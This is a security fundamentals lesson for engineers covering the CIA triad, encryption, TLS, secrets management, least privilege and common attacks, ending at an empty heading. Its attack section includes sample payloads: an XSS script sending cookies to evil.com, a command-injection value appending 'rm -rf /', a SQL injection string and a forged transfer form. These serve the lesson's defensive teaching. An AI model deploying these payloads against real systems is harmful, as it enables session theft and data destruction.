---
title: "Security Fundamentals"
description: "Learn the foundations of security — the CIA triad, encryption, authentication, secrets management, and common attack vectors."
position: 11
icon: "shield"
---

# Security Fundamentals

Security is everyone's responsibility. It is not an add-on, an afterthought, or something you hand off to a specialized team and forget about. Security is woven into every layer of infrastructure — from the permissions on a single file to the encryption protocols protecting data as it crosses the internet. Whether you are writing a shell script, building a CI/CD pipeline, deploying containers, or configuring cloud resources, the decisions you make have security implications. Understanding the fundamentals covered in this lesson will help you make those decisions well, recognize risks before they become incidents, and build systems that are resilient by design rather than by luck.

## Why It Matters

Data breaches are not hypothetical. They happen constantly, and they are expensive. The average cost of a data breach exceeds four million dollars, and that figure does not account for the reputational damage, lost customer trust, and regulatory penalties that follow. High-profile breaches at major companies make headlines, but smaller organizations are targeted just as frequently — often because they lack the basic security hygiene that would stop common attacks.

Cloud providers like AWS, Azure, and Google Cloud operate under a **shared responsibility model**. The provider secures the underlying infrastructure (physical data centers, hypervisors, network backbone), but you are responsible for everything you build on top of it: your configurations, your access controls, your data, your application code. A misconfigured S3 bucket or an overly permissive IAM role is your problem, not the cloud provider's.

Security is a first-class concern in every technical role. DevOps engineers manage secrets, configure firewalls, and harden CI/CD pipelines. Platform engineers design access control systems and enforce policies. Software developers validate input, handle authentication, and protect user data. Site reliability engineers monitor for anomalies, respond to incidents, and ensure systems recover. Even if your job title does not include the word "security," you make security decisions every day — every time you set a file permission, choose where to store a credential, or decide whether to update a dependency.

The goal of this lesson is not to make you a penetration tester or a security researcher. It is to give you the foundational knowledge that every engineer needs to build and operate systems responsibly.

## What You'll Learn

- The CIA triad: confidentiality, integrity, and availability
- The difference between authentication and authorization
- How symmetric encryption, asymmetric encryption, and hashing work
- What TLS certificates are and how HTTPS protects data in transit
- How to manage secrets safely in development and production
- The principle of least privilege and how to apply it
- Common attack vectors and how to defend against them
- How security applies to shell scripting, version control, CI/CD, containers, Kubernetes, and Infrastructure as Code

---

## The CIA Triad

The CIA triad is the foundational model for thinking about information security. Every security decision you make relates to one or more of these three pillars: **Confidentiality**, **Integrity**, and **Availability**. These are not independent concerns — they interact with and sometimes tension against each other. Making data highly available might introduce confidentiality risks. Encrypting everything for confidentiality might impact availability if key management fails. Good security balances all three.

```mermaid
graph TD
    S["Security"]
    C["Confidentiality<br/>Only authorized users<br/>can access data"]
    I["Integrity<br/>Data has not been<br/>tampered with"]
    A["Availability<br/>Systems are accessible<br/>when needed"]

    S --> C
    S --> I
    S --> A

    style S fill:#1a1a2e,stroke:#e94560,color:#ffffff
    style C fill:#1a1a2e,stroke:#0f3460,color:#ffffff
    style I fill:#1a1a2e,stroke:#0f3460,color:#ffffff
    style A fill:#1a1a2e,stroke:#0f3460,color:#ffffff
```

### Confidentiality

Confidentiality means that data is accessible only to those who are authorized to see it. When confidentiality is breached, sensitive information is exposed to people or systems that should not have access.

Confidentiality controls include:

- **Encryption**: Data is transformed so that only someone with the correct key can read it. This applies to data at rest (files on disk, database records) and data in transit (network traffic).
- **Access controls**: Systems enforce who can read, write, or execute resources. This includes file permissions on a Linux system, IAM policies in a cloud environment, and role-based access control in an application.
- **File permissions**: On Linux, every file has owner, group, and other permissions. Your SSH private key should be readable only by you (`chmod 600`). If others can read it, SSH will refuse to use it.
- **Network segmentation**: Sensitive systems are isolated on separate network segments, so even if an attacker gains access to one part of the network, they cannot reach everything.

A practical example: when you store database credentials in an environment variable rather than hardcoding them in source code, you are protecting confidentiality. When you encrypt a backup before uploading it to cloud storage, you are protecting confidentiality. When you restrict SSH access to specific IP ranges, you are protecting confidentiality.

### Integrity

Integrity means that data has not been altered, corrupted, or tampered with — either accidentally or maliciously. When integrity is compromised, you cannot trust that data is accurate or that systems are behaving as expected.

Integrity controls include:

- **Checksums and hashes**: A hash function generates a fixed-size fingerprint of data. If even one bit of the data changes, the hash changes completely. You can verify a downloaded file by comparing its hash against the published value.
- **Digital signatures**: A cryptographic signature proves that data was created by a specific entity and has not been modified since. Git commits can be signed with GPG keys. Software packages are signed by their maintainers.
- **Version control**: Git tracks every change to every file, who made the change, and when. This provides a complete audit trail and the ability to detect unauthorized modifications.
- **File integrity monitoring**: Tools like AIDE or Tripwire watch critical system files and alert you if anything changes unexpectedly.

A practical example: when you run `sha256sum` on a downloaded ISO to verify it matches the published hash, you are verifying integrity. When you sign your Git commits, you are asserting integrity. When a package manager checks the signature on a package before installing it, it is verifying integrity.

### Availability

Availability means that systems and data are accessible when authorized users need them. A perfectly secure system that nobody can access is useless. Availability is about ensuring uptime, reliability, and resilience.

Availability controls include:

- **Redundancy**: Running multiple instances of a service across different availability zones or regions so that if one fails, others continue serving traffic.
- **Backups**: Regularly copying data to a separate location so it can be restored if the primary copy is lost or corrupted. Backups must be tested — an untested backup is not a backup.
- **Monitoring and alerting**: Tracking system health metrics and alerting engineers when something degrades or fails, so issues can be resolved before they cause outages.
- **DDoS protection**: Distributed Denial of Service attacks flood a system with traffic to overwhelm it. Protections include rate limiting, content delivery networks (CDNs), and cloud-based DDoS mitigation services.
- **Disaster recovery planning**: Documented procedures for recovering from catastrophic failures, including who does what, in what order, and how quickly.

A practical example: when you deploy your application across multiple availability zones, you are protecting availability. When you set up automated health checks that restart failed containers, you are protecting availability. When you configure a CDN to absorb traffic spikes, you are protecting availability.

---

## Authentication vs Authorization

Authentication and authorization are two distinct concepts that are often confused. They work together but answer different questions. Getting this distinction right is essential for designing and troubleshooting access control systems.

### Authentication (AuthN)

Authentication answers the question: **"Who are you?"**

It is the process of verifying identity. Before a system can decide what you are allowed to do, it must first confirm that you are who you claim to be. Authentication mechanisms include:

- **Passwords**: The most basic form. You prove your identity by providing a secret that only you should know. Passwords alone are weak because they can be guessed, stolen, or reused across multiple services.
- **SSH keys**: A cryptographic key pair. Your private key stays on your machine, and your public key is placed on the server. When you connect, the server challenges your client to prove it possesses the private key without ever transmitting the key itself.
- **Multi-Factor Authentication (MFA)**: Combines two or more factors: something you know (password), something you have (phone, hardware key), and something you are (biometrics). MFA dramatically reduces the risk of account compromise because an attacker would need to steal multiple factors.
- **Certificates**: X.509 certificates can authenticate both servers (your browser verifying a website) and clients (mutual TLS, where the server also verifies the client).
- **Tokens**: Short-lived credentials issued after initial authentication. OAuth tokens, JWTs (JSON Web Tokens), and API keys are all forms of token-based authentication.

### Authorization (AuthZ)

Authorization answers the question: **"What are you allowed to do?"**

Once a system knows who you are, it decides what you can access and what actions you can perform. Authorization mechanisms include:

- **File permissions**: Linux file permissions determine which users and groups can read, write, or execute a file. The command `chmod 644 index.html` allows the owner to read and write, while everyone else can only read.
- **IAM policies**: Cloud platforms use Identity and Access Management policies to define what actions a user or service can perform on which resources. An IAM policy might allow a user to read from a specific S3 bucket but not delete anything.
- **Role-Based Access Control (RBAC)**: Instead of assigning permissions directly to users, you define roles (like "developer," "admin," or "viewer") and assign permissions to roles. Users are then assigned roles. This simplifies management at scale.
- **Attribute-Based Access Control (ABAC)**: Permissions are determined by attributes of the user, the resource, and the environment. For example, "users in the engineering department can access production logs during business hours."

### The Relationship

Authentication always happens first. You cannot authorize someone whose identity you have not verified. The flow looks like this:

1. User presents credentials (password, SSH key, token)
2. System verifies credentials (authentication)
3. System looks up what the authenticated user is allowed to do (authorization)
4. System grants or denies the requested action

```mermaid
flowchart LR
    U["User requests access"] --> AuthN["Authentication<br/>'Who are you?'"]
    AuthN -->|Identity verified| AuthZ["Authorization<br/>'What can you do?'"]
    AuthZ -->|Permitted| G["Access Granted"]
    AuthZ -->|Denied| D["Access Denied"]
    AuthN -->|Failed| R["Rejected"]

    style AuthN fill:#1a1a2e,stroke:#e94560,color:#ffffff
    style AuthZ fill:#1a1a2e,stroke:#0f3460,color:#ffffff
    style G fill:#16213e,stroke:#0f3460,color:#ffffff
    style D fill:#1a1a2e,stroke:#e94560,color:#ffffff
    style R fill:#1a1a2e,stroke:#e94560,color:#ffffff
```

### Comparison Table

| Aspect | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| **Question** | "Who are you?" | "What can you do?" |
| **Purpose** | Verify identity | Grant or deny permissions |
| **Happens** | First | After authentication |
| **Mechanisms** | Passwords, SSH keys, MFA, certificates | File permissions, IAM policies, RBAC |
| **Failure result** | Login rejected | Action denied (403 Forbidden) |
| **Example** | Logging into GitHub with your password and MFA | Having push access to a specific repository |
| **Analogy** | Showing your ID at the door | Your ticket determines which seats you can use |

---

## Encryption Basics

Encryption is the process of transforming readable data (plaintext) into an unreadable format (ciphertext) so that only authorized parties can read it. It is one of the most important tools for protecting confidentiality and, in some cases, integrity. There are three related but distinct concepts you need to understand: symmetric encryption, asymmetric encryption, and hashing.

### Symmetric Encryption

Symmetric encryption uses the **same key** to both encrypt and decrypt data. If you encrypt a file with a key, anyone who has that key can decrypt it. This means the key itself must be kept secret and transmitted securely.

**How it works:**

1. You have plaintext data and a secret key
2. An encryption algorithm (like AES) combines them to produce ciphertext
3. To decrypt, you apply the same key to the ciphertext using the decryption algorithm
4. The original plaintext is recovered

**The standard: AES-256.** AES (Advanced Encryption Standard) with a 256-bit key is the gold standard for symmetric encryption. It is used by governments, financial institutions, and cloud providers worldwide. When a cloud provider says your data is "encrypted at rest," they almost certainly mean AES-256.

**Characteristics:**

- **Fast**: Symmetric encryption is computationally efficient, making it suitable for encrypting large amounts of data
- **Key distribution problem**: Both parties need the same key. How do you securely share the key? This is the fundamental challenge of symmetric encryption, and it is often solved by using asymmetric encryption for the initial key exchange
- **Used for**: Data at rest (encrypted disks, database encryption), data in transit (after the TLS handshake establishes a shared key), file encryption, backup encryption

**Example — encrypting a file with OpenSSL:**

```bash
# Encrypt a file with AES-256-CBC
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pbkdf2

# Decrypt the file
openssl enc -aes-256-cbc -d -in file.enc -out file.txt -pbkdf2
```

You will be prompted for a password. OpenSSL derives the encryption key from the password you provide. The `-salt` flag adds randomness to prevent identical plaintexts from producing identical ciphertexts. The `-pbkdf2` flag uses a modern key derivation function.

### Asymmetric Encryption

Asymmetric encryption uses a **key pair**: a public key and a private key. They are mathematically linked, but you cannot derive the private key from the public key. Data encrypted with the public key can only be decrypted with the corresponding private key, and vice versa.

**How it works:**

1. You generate a key pair: one public key and one private key
2. You share your public key openly — anyone can have it
3. Someone encrypts data with your public key and sends it to you
4. Only your private key can decrypt it

**The reverse also works for signing:**

1. You create a digital signature by encrypting a hash of your data with your private key
2. Anyone with your public key can decrypt the signature and verify the hash
3. This proves the data came from you (because only you have the private key) and has not been modified (because the hash matches)

**Common algorithms:**

- **RSA**: Widely used, supports both encryption and signing. Key sizes of 2048 or 4096 bits are standard. Older but battle-tested.
- **Ed25519**: A modern elliptic curve algorithm. Shorter keys, faster operations, and considered more secure than RSA at equivalent key lengths. This is what you generate when you run `ssh-keygen -t ed25519`.

**Used for:**

- **SSH keys**: You already generated these in [Version Control](/learn/foundations/version-control/). Your public key goes on the server, your private key stays on your machine.
- **TLS handshake**: When your browser connects to an HTTPS website, asymmetric encryption is used to securely exchange a symmetric key. After the handshake, the symmetric key handles the actual data encryption (because it is faster).
- **GPG/PGP**: Used to sign and encrypt emails, files, and Git commits.
- **Code signing**: Software developers sign their releases so users can verify authenticity.

**Example — how your SSH key pair works:**

```bash
# You already generated a key pair:
# Private key: ~/.ssh/id_ed25519 (NEVER share this)
# Public key:  ~/.ssh/id_ed25519.pub (safe to share)

# View your public key
cat ~/.ssh/id_ed25519.pub

# The server has your public key in ~/.ssh/authorized_keys
# When you connect, the server uses your public key to challenge your client
# Your client proves it has the private key without transmitting it
```

### Hashing

Hashing is a **one-way function** that takes input of any size and produces a fixed-size output (called a hash, digest, or fingerprint). Hashing is **not encryption** — you cannot reverse a hash to recover the original data. This is by design.

**Properties of a good hash function:**

- **Deterministic**: The same input always produces the same hash
- **Fixed output size**: Regardless of input size, the output is always the same length (SHA-256 always produces a 256-bit hash)
- **Avalanche effect**: A tiny change in input produces a completely different hash
- **One-way**: You cannot reconstruct the input from the hash
- **Collision resistant**: It is computationally infeasible to find two different inputs that produce the same hash

**Common algorithms:**

- **SHA-256**: Part of the SHA-2 family. Produces a 256-bit (32-byte) hash. Widely used for file integrity, certificates, and blockchain.
- **SHA-512**: Same family, 512-bit output. Used where a longer hash is needed.
- **bcrypt, scrypt, Argon2**: Specialized password hashing algorithms. They are intentionally slow to make brute-force attacks impractical. Never use a general-purpose hash like SHA-256 for password storage — use a purpose-built password hash.

**Used for:**

- **Password storage**: Systems store a hash of your password, not the password itself. When you log in, the system hashes what you type and compares it to the stored hash.
- **File integrity verification**: After downloading a file, you compute its hash and compare it to the published hash. If they match, the file has not been tampered with.
- **Git commits**: Every commit in Git is identified by a SHA-1 hash (Git is migrating to SHA-256). This hash is computed from the commit content, parent commit, author, timestamp, and message. Change any detail and the hash changes.
- **Digital signatures**: The data is hashed first, and then the hash is signed (not the entire data, which would be slow for large files).

**Example — verifying file integrity:**

```bash
# Generate a SHA-256 hash of a file
sha256sum file.txt
# Output: e3b0c44298fc1c149afbf4c8996fb924...  file.txt

# Verify a downloaded file against a known hash
echo "expected_hash_here  file.txt" | sha256sum --check
# Output: file.txt: OK
```

**Example — the avalanche effect:**

```bash
echo -n "hello" | sha256sum
# 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824

echo -n "Hello" | sha256sum
# 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
```

Changing a single character (lowercase "h" to uppercase "H") produces a completely different hash. This makes hashing extremely sensitive to any modification.

---

## Certificates and PKI

When you visit a website over HTTPS, how does your browser know it is actually talking to the real server and not an impostor? The answer is **TLS certificates** and **Public Key Infrastructure (PKI)**.

### What TLS Certificates Are

A TLS certificate (often called an SSL certificate, though SSL is the deprecated predecessor to TLS) is a digital document that binds a public key to an identity. It says, in effect, "this public key belongs to github.com, and a trusted authority has verified this claim."

A certificate contains:

- The **subject** (the domain name or organization the certificate is issued to)
- The **public key** belonging to the subject
- The **issuer** (the Certificate Authority that signed the certificate)
- **Validity dates** (certificates expire and must be renewed)
- A **digital signature** from the issuer, proving the certificate has not been tampered with

### Certificate Authorities (CAs)

A Certificate Authority is a trusted third party that verifies identities and issues certificates. When a CA signs a certificate, it is vouching that the certificate holder controls the domain or is the organization they claim to be.

Your operating system and browser come preloaded with a set of **trusted root CAs**. These are organizations like DigiCert, Let's Encrypt, and Sectigo whose root certificates are embedded in your trust store. Any certificate signed (directly or indirectly) by one of these trusted roots is considered valid.

### Chain of Trust

Certificates form a chain:

1. **Root CA certificate**: Self-signed, stored in your trust store. The root CA is the ultimate authority.
2. **Intermediate CA certificate**: Signed by the root CA. Intermediate CAs do the actual work of issuing certificates. This protects the root CA's private key — if an intermediate CA is compromised, the root CA can revoke it without replacing every certificate in the world.
3. **Leaf certificate (end-entity certificate)**: Signed by the intermediate CA. This is the certificate the server presents to your browser.

```mermaid
flowchart TD
    Root["Root CA Certificate<br/>(Self-signed, in your trust store)"]
    Inter["Intermediate CA Certificate<br/>(Signed by Root CA)"]
    Leaf["Leaf Certificate<br/>(Signed by Intermediate CA)<br/>e.g., github.com"]

    Root -->|Signs| Inter
    Inter -->|Signs| Leaf

    style Root fill:#1a1a2e,stroke:#e94560,color:#ffffff
    style Inter fill:#16213e,stroke:#0f3460,color:#ffffff
    style Leaf fill:#1a1a2e,stroke:#0f3460,color:#ffffff
```

Your browser walks the chain from the leaf certificate up to the root. If it can build a complete chain to a trusted root, the certificate is valid. If any link in the chain is missing, expired, or revoked, the connection is rejected.

### Let's Encrypt

[Let's Encrypt](https://letsencrypt.org/) is a free, automated, and open Certificate Authority. Before Let's Encrypt, obtaining a TLS certificate required paying a CA and going through a manual verification process. Let's Encrypt changed this by providing certificates at no cost, with fully automated issuance and renewal.

Key facts about Let's Encrypt:

- **Free**: No charge for certificates
- **Automated**: Tools like [Certbot](https://certbot.eff.org/) handle issuance and renewal automatically
- **Widely trusted**: Let's Encrypt certificates are trusted by all major browsers and operating systems
- **Short-lived**: Certificates are valid for 90 days, encouraging automation and reducing the window of exposure if a key is compromised
- **Domain validation**: Let's Encrypt verifies that you control the domain (not the organization behind it). For most use cases, this is sufficient.

### How HTTPS Works (Simplified)

When your browser connects to an HTTPS website, the following happens:

1. **Client Hello**: Your browser connects to the server on port 443 and sends a list of supported TLS versions and cipher suites.
2. **Server Hello**: The server selects a TLS version and cipher suite, then sends its TLS certificate.
3. **Certificate verification**: Your browser verifies the certificate chain. It checks that the certificate is signed by a trusted CA, is not expired, and matches the domain you are connecting to.
4. **Key exchange**: Using asymmetric encryption, the client and server agree on a shared symmetric key. This key will be used for the rest of the session.
5. **Encrypted communication**: All subsequent data is encrypted with the shared symmetric key using fast symmetric encryption (like AES).

This is why you see asymmetric encryption used for the handshake (to securely exchange keys) and symmetric encryption used for the actual data transfer (because it is faster).

```mermaid
sequenceDiagram
    participant Browser
    participant Server

    Browser->>Server: Client Hello (supported ciphers)
    Server->>Browser: Server Hello + TLS Certificate
    Browser->>Browser: Verify certificate chain
    Browser->>Server: Key exchange (asymmetric)
    Server->>Browser: Key exchange complete
    Note over Browser,Server: Shared symmetric key established
    Browser->>Server: Encrypted data (symmetric)
    Server->>Browser: Encrypted data (symmetric)
```

> **Try It**: Run `openssl s_client -connect github.com:443` to inspect GitHub's certificate chain. Look for the subject (`s:`), issuer (`i:`), and the chain of certificates. Press `Ctrl+C` to exit.

---

## Secrets Management

A **secret** is any piece of data that grants access or control and must not be exposed. Secrets include:

- API keys and access tokens
- Passwords and passphrases
- Private keys (SSH, TLS, GPG)
- Database connection strings
- OAuth client secrets
- Encryption keys
- Service account credentials

Secrets management is the practice of storing, accessing, rotating, and revoking these credentials securely throughout their lifecycle. Poor secrets management is one of the most common causes of security breaches.

### Environment Variables

Storing secrets in environment variables is better than hardcoding them in source code, but it is not perfect.

```bash
# Set a secret as an environment variable
export DATABASE_URL="postgres://user:password@host:5432/dbname"

# Use it in your application
psql "$DATABASE_URL"
```

**Limitations of environment variables:**

- Visible in `/proc/<pid>/environ` on Linux (to the user that owns the process and to root)
- Can leak into logs if the application or framework logs its environment
- Inherited by child processes, which may not need them
- No audit trail of who accessed them or when
- No automatic rotation

Environment variables are acceptable for local development and as the mechanism by which secrets are delivered to an application (after being fetched from a proper secrets store), but they should not be the primary storage mechanism.

### .env Files

`.env` files are a development convenience. They store environment variables in a file that is loaded when the application starts.

```bash
# .env file (NEVER commit this)
DATABASE_URL=postgres://user:password@localhost:5432/devdb
API_KEY=sk-development-key-here
SECRET_TOKEN=abc123def456
```

**Critical rules for .env files:**

- Add `.env` to your `.gitignore` immediately when creating a project
- Never commit `.env` files to version control
- Use `.env.example` (with placeholder values, not real secrets) to document which variables are needed
- Different environments (development, staging, production) should have different secrets

### Secrets in CI/CD

CI/CD systems like GitHub Actions provide built-in secrets management. You store secrets in the platform's settings, and they are injected as environment variables during pipeline execution.

```yaml
# .github/workflows/deploy.yml
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Deploy to production
        env:
          API_KEY: ${{ secrets.API_KEY }}
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: ./deploy.sh
```

GitHub Actions automatically masks secrets in logs. If a secret's value appears in the output, it is replaced with `***`. However, this is not foolproof — if you base64-encode a secret or split it across multiple lines, masking may not catch it. Be careful about what your scripts output.

### Vault Systems

For production environments, dedicated secrets management systems provide features that environment variables and `.env` files cannot:

- **[HashiCorp Vault](https://developer.hashicorp.com/vault/docs)**: An open-source secrets management tool. It stores secrets encrypted, provides fine-grained access control, maintains an audit log of every access, and can generate short-lived dynamic credentials (e.g., temporary database passwords that expire after an hour).
- **AWS Secrets Manager**: A managed service for storing and retrieving secrets. Supports automatic rotation of RDS database credentials.
- **Azure Key Vault**: Microsoft's managed secrets, keys, and certificate store. Integrates with Azure Active Directory for access control.
- **Google Cloud Secret Manager**: Google's managed secrets service. Supports versioning and fine-grained IAM policies.

These systems solve the problems that environment variables cannot: access auditing, automatic rotation, fine-grained access control, and centralized management across many services.

### The Cardinal Rule

**NEVER commit secrets to Git.** This is the single most important rule of secrets management.

Even if you delete a secret in a later commit, it remains in the Git history. Anyone who clones the repository can find it. Secrets committed to public repositories are discovered by automated scanners within minutes and exploited within hours.

If you accidentally commit a secret:

1. **Rotate the secret immediately** — generate a new one and revoke the old one
2. Consider the old secret permanently compromised, regardless of how quickly you removed it
3. Use `git filter-branch` or [BFG Repo-Cleaner](https://rtyley.github.io/bfg-repo-cleaner/) to remove it from history (but still consider it compromised)

**Searching for leaked secrets in Git history:**

```bash
# Search for the literal string "password" in all commits
git log -S "password" --oneline

# Search for potential AWS access keys (pattern matching)
git log -S "AKIA" --oneline

# Search for common secret patterns
git log -S "api_key" --oneline
git log -S "secret" --oneline
```

Tools like [git-secrets](https://github.com/awslabs/git-secrets), [truffleHog](https://github.com/trufflesecurity/trufflehog), and [gitleaks](https://github.com/gitleaks/gitleaks) automate this scanning and can be integrated into pre-commit hooks to prevent secrets from being committed in the first place.

### .gitignore for Secrets

Your `.gitignore` should exclude all files that commonly contain secrets:

```gitignore
# Environment files
.env
.env.local
.env.*.local

# Private keys
*.pem
*.key
id_rsa
id_ed25519

# Credential files
credentials.json
service-account.json
*-credentials.json

# Terraform state (may contain secrets)
*.tfstate
*.tfstate.backup
.terraform/

# Docker environment files
docker-compose.override.yml

# IDE-specific files that might contain project secrets
.idea/
.vscode/settings.json

# OS-generated files
.DS_Store
Thumbs.db
```

---

## The Principle of Least Privilege

The principle of least privilege states that every user, process, and system should have **only the minimum permissions necessary** to perform its intended function — and nothing more. If a developer only needs to read logs, they should not have write access to the database. If a CI/CD pipeline only needs to push container images, it should not have permission to delete the production cluster.

Least privilege limits the blast radius of a security incident. If an account is compromised, the damage is limited to what that account was authorized to do. Over-privileged accounts turn minor breaches into catastrophic ones.

### In Linux

```bash
# BAD: Running a web server as root
sudo python3 -m http.server 80

# GOOD: Running as a dedicated non-root user
sudo -u www-data python3 -m http.server 8080

# BAD: Making a script executable by everyone
chmod 777 deploy.sh

# GOOD: Executable only by owner
chmod 700 deploy.sh

# BAD: Adding a user to the sudo group for one task
usermod -aG sudo developer

# GOOD: Using sudoers to allow specific commands
# In /etc/sudoers.d/developer:
# developer ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp
```

### In Cloud IAM

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "BAD - Full admin access",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "GOOD - Read-only access to specific S3 bucket",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-app-bucket",
        "arn:aws:s3:::my-app-bucket/*"
      ]
    }
  ]
}
```

### In Containers

```dockerfile
# BAD: Running as root (the default)
FROM node:20
COPY . /app
CMD ["node", "server.js"]

# GOOD: Running as a non-root user
FROM node:20
RUN groupadd -r appgroup && useradd -r -g appgroup appuser
COPY --chown=appuser:appgroup . /app
USER appuser
CMD ["node", "server.js"]
```

### In Kubernetes

```yaml
# GOOD: RBAC role with minimal permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: log-reader
rules:
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get", "list"]
```

This role allows reading pod logs in the production namespace — nothing else. No creating pods, no deleting deployments, no accessing secrets.

### Quick Reference: Over-Permissive vs Least-Privilege

| Instead of... | Do this... |
|---|---|
| Running containers as root | Create a non-root user in your Dockerfile |
| Using `chmod 777` | Use `chmod 600` for private files, `chmod 755` for executables |
| Granting `*` (all actions) in IAM | Specify only the actions needed |
| Granting access to `*` (all resources) in IAM | Scope to specific resource ARNs |
| Sharing root database credentials | Create per-service database accounts with limited grants |
| Using a personal access token with all scopes | Create tokens with minimal scopes, set expiration dates |
| Adding users to the admin/sudo group | Use granular RBAC roles |
| Giving CI/CD full cloud admin access | Use OIDC and role assumption scoped to deployment actions |
| Using long-lived credentials | Use short-lived tokens with automatic rotation |

---

## Common Attack Vectors

This section provides awareness of how common attacks work so you can defend against them. The goal is understanding, not exploitation. Knowing how attacks work helps you write more secure code, configure systems more carefully, and recognize vulnerabilities before they are exploited.

### Injection

Injection attacks occur when untrusted input is treated as code or commands. The most well-known form is **SQL injection**, but the same principle applies to command injection, LDAP injection, and any context where user input is interpreted.

**SQL injection — conceptual example:**

```python
# VULNERABLE: User input is concatenated into the query
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
# If username is: ' OR '1'='1
# The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
# This returns ALL users

# SAFE: Parameterized query — the database treats the input as data, not code
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

**Command injection — conceptual example:**

```python
# VULNERABLE: User input is passed to a shell command
filename = request.form['filename']
os.system(f"cat /uploads/{filename}")
# If filename is: file.txt; rm -rf /
# The command becomes: cat /uploads/file.txt; rm -rf /

# SAFE: Use subprocess with a list (no shell interpretation)
import subprocess
subprocess.run(["cat", f"/uploads/{filename}"], check=True)
```

**Prevention:**
- Never concatenate user input into queries or commands
- Use parameterized queries (prepared statements) for all database interactions
- Use subprocess lists instead of shell strings
- Validate and sanitize all input

### Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into web pages that are then executed in other users' browsers. If a website displays user-submitted content without sanitizing it, an attacker can inject JavaScript that steals session cookies, redirects users, or modifies the page content.

**Conceptual example:**

```html
<!-- A comment form that displays user input without sanitization -->
<!-- User submits: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script> -->
<!-- The script executes in every visitor's browser -->
```

**Prevention:**
- Sanitize (escape) all output displayed in HTML
- Use Content Security Policy (CSP) headers to restrict which scripts can execute
- Use frameworks that auto-escape output by default (React, Angular, and modern templating engines do this)
- Never use `innerHTML` with unsanitized user input

### Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user into making an unintended request. If you are logged into your bank and visit a malicious website, that website could submit a hidden form to your bank's transfer endpoint. Your browser automatically includes your session cookie, so the bank thinks the request is legitimate.

**Conceptual example:**

```html
<!-- Malicious page contains a hidden form -->
<form action="https://bank.com/transfer" method="POST" id="evil-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

**Prevention:**
- Use CSRF tokens: the server generates a unique token for each session/form, and the token must be included in the request. Since the attacker's site cannot read the token, they cannot forge a valid request.
- Use `SameSite` cookie attributes to prevent cookies from being sent in cross-origin requests
- Require re-authentication for sensitive actions

### Supply Chain Attacks

A supply chain attack compromises a dependency rather than your code directly. If an attacker gains control of a popular npm package, PyPI library, or GitHub Action, they can inject malicious code that runs in every project that uses that dependency.

**Real-world examples have affected major companies through compromised build tools, dependency confusion attacks (where a malicious public package has the same name as a private internal one), and maintainer account takeovers.**

**Prevention:**
- **Pin dependency versions**: Use exact versions (`1.2.3`) rather than ranges (`^1.2.3`) in production
- **Use lockfiles**: `package-lock.json`, `Pipfile.lock`, `go.sum` — and commit them to version control
- **Verify checksums**: Package managers can verify that downloaded packages match expected hashes
- **Pin CI/CD action versions**: Use full commit SHAs instead of tags for GitHub Actions

```yaml
# BAD: Tag can be moved to point to different code
- uses: actions/checkout@v4

# GOOD: SHA is immutable
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

- **Scan dependencies**: Use tools like [Dependabot](https://docs.github.com/en/code-security/dependabot), [Snyk](https://snyk.io/), or `npm audit` to identify known vulnerabilities
- **Review new dependencies**: Before adding a dependency, check its maintainers, download count, last update, and source code

### Credential Stuffing

Credential stuffing uses username/password pairs leaked from one breach to attempt logins on other services. Because many people reuse passwords across services, this is surprisingly effective.

**How it works:**

1. A data breach exposes millions of email/password pairs
2. Attackers use automated tools to try those pairs against other services (banks, email providers, cloud consoles)
3. Any account where the user reused the same password is compromised

**Prevention:**
- **Enable MFA everywhere**: Even if your password is compromised, the attacker cannot log in without the second factor
- **Use unique passwords for every service**: A password manager makes this practical
- **Use a password manager**: Tools like [Bitwarden](https://bitwarden.com/), 1Password, or KeePass generate and store strong, unique passwords for every account
- **Check for compromises**: [Have I Been Pwned](https://haveibeenpwned.com/) lets you check whether your email or passwords have appeared in known breaches
- **Implement rate limiting**: On the service side, limit login attempts to slow down automated attacks
- **Monitor for anomalies**: Detect and flag login attempts from unusual locations or patterns

For the full list of common web application security risks, see the [OWASP Top 10](https://owasp.org/www-project-top-ten/).

---

## Security in Practice

Security is not a standalone topic — it is embedded in everything you build and operate. Here is how the concepts from this lesson connect to topics you have already covered and topics coming up in your learning path.

### Shell Scripting

In [Shell Scripting](/learn/foundations/shell-scripting/), you learned to automate tasks with Bash. Security considerations for scripts include:

- **Validate all inputs**: Never trust data coming from users, files, or external commands. Check that inputs match expected patterns before using them.
- **Avoid `eval`**: The `eval` command executes a string as a command. If that string contains user input, it is a command injection vulnerability.
- **Quote your variables**: Unquoted variables can cause word splitting and glob expansion, leading to unexpected behavior. Always use `"$variable"` instead of `$variable`.
- **Set strict mode**: Start scripts with `set -euo pipefail` to exit on errors, treat unset variables as errors, and catch failures in pipelines.
- **Be careful with temporary files**: Use `mktemp` to create temporary files with secure permissions, and clean them up when done.

```bash
# BAD: Unquoted variable and no input validation
filename=$1
cat /data/$filename

# GOOD: Quoted variable, validated input, strict mode
set -euo pipefail
filename="$1"
if [[ ! "$filename" =~ ^[a-zA-Z0-9._-]+$ ]]; then
  echo "Invalid filename" >&2
  exit 1
fi
cat "/data/$filename"
```

### Version Control

